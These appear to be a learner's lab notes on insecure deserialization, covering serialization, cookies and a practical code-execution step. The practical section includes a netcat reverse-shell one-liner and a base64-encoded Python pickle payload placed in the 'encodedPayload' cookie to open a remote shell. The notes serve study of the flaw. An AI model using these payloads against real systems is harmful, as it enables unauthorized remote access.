# Insecure Deserialization

Insecure Deserialization is a vulnerability that allows attackers abuse an application logic that has no integrity check or validation while fetching data (unstrusted data)
## Objects

Objects in OOP is a representation of thing that has:
1. State
2. Behaviour

## Deserialization

Serialization is a process of converting an object into a simpler form for transmitting between systems or networks for further processing.

Deserialization is a process of reverting the simpler form back into an object but in acceptable form by the recipient systems/apps.

## Cookies

Web apps uses HTTP/S protocol that is stateless, means a web server does not remember things like who the client is. 

Cookies is a piece of data that stores client information and is send along in the http headers which gives the server kind of ability to remember (maintain) his client.

**Cookies attributes**

![284fd0240f23a545808eb00043cd884c.png](./_resources/afede99b6da24deaa2154463b289bbc9.png)

## Practical

### Cookies

A weak session cookies can be tampered.

![39ad1311aecab8f6ae8a632a97fee116.png](./_resources/b48c77048b9f471295950eac9b43faba.png)

Or used for privilege escalation

![697e8e9f9eadba11f3562cac0be2b839.png](./_resources/766e85ee62ed48d7b8280fc8e022a9e4.png)

![ea80831c8123755f8588765fbdbd7cc5.png](./_resources/81240dc1f8bc44fb8a0e79c05629f7fe.png)

### Code execution

The weak cookie name to exploit is `encodedPayload`
![3f83422a417d75f53fb20b1e00e7925c.png](./_resources/04aee2d039ff4a678b7a9428335a49d3.png)

The core of the payload
```
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat IP_ADDR 4444 > /tmp/f
```

New value for `encodedPayload` from the encoded payload, malicious one.
```
gASVdAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjFlybSAvdG1wL2Y7IG1rZmlmbyAvdG1wL2Y7IGNhdCAvdG1wL2YgfCAvYmluL3NoIC1pIDI+JjEgfCBuZXRjYXQgMTAuOS4zMC4xMTUgNDQ0NCA+IC90bXAvZpSFlFKULg==
```

Once the page reloaded with new value, we'll have a remote shell.

![446e0b1998194816728f43c04dee9ec2.png](./_resources/96c01eac14e94755a5ebda4981da12a6.png)


![7c762571be5f28570d249cb57580b5ef.png](./_resources/2984d18d380c4c60aecf4106580d330d.png)

## Questions

![ab4cb0f210738b0acb523b59c2a2d844.png](./_resources/015b0257a14e4c99b015dfce24d7638f.png)

![9ad4a1dda1e2c94b8351ac0b6631e02b.png](./_resources/051943c51dd54d3baeec0e432c9c4988.png)

![25718e8888514a93678e8e3dc44494e7.png](./_resources/e8a74a5a1bd04ea98f931bde1f4a3b1b.png)

![db0cd622555404d46a77ae3792bd5351.png](./_resources/b50d1714f4f745a2989ecd01b2d123f3.png)